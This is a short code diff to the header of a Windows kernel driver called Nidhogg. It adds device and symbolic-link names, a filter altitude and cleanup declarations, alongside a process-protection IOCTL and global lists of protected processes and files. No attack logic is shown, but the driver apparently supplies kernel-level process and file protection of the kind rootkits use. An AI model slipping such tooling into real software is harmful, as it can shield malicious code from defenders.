@@ -4,8 +4,11 @@
 #include "FastMutex.h"
 #include "AutoLock.h"
 
-#define DRIVER_PREFIX "NidhoggDrv: "
+#define DRIVER_PREFIX "Nidhogg: "
+#define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
+#define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
 #define DRIVER_TAG 'hdiN'
+#define DRIVER_ALTITUDE L"31105.6171"
 
 // ** IOCTLS ********************************************************************************************
 #define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -28,9 +31,10 @@
 NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
 DRIVER_UNLOAD NidhoggUnload;
 DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
+void ClearAll();
 
 // Globals.
-PVOID registrationHandle;
+PVOID registrationHandle = NULL;
 
 struct ProcessGlobals {
 	int PidsCount;
@@ -45,7 +49,7 @@ ProcessGlobals pGlobals;
 
 struct FileGlobals {
 	int FilesCount;
-	PWCH Files[MAX_FILES];
+	WCHAR* Files[MAX_FILES];
 	FastMutex Lock;
 
 	void Init() {
